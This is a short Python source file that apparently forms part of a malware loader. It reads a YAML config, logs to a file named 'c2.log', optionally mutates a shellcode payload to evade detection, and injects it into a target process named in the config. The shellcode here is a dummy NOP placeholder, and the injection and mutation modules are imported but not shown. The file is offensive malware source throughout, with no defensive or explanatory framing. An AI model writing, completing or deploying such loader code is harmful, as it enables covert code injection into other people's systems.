from mutator.mutator import mutate_payload
from modules.injector import inject_shellcode
import yaml, logging

def launch_loader(config_path):
    with open(config_path) as f:
        config = yaml.safe_load(f)

    logging.basicConfig(filename="logs/c2.log", level=logging.INFO)
    shellcode = b"\\x90" * 100  # dummy shellcode placeholder

    if config["loader"].get("mutation"):
        shellcode = mutate_payload(shellcode)

    inject_shellcode(shellcode, config["loader"]["target_process"])
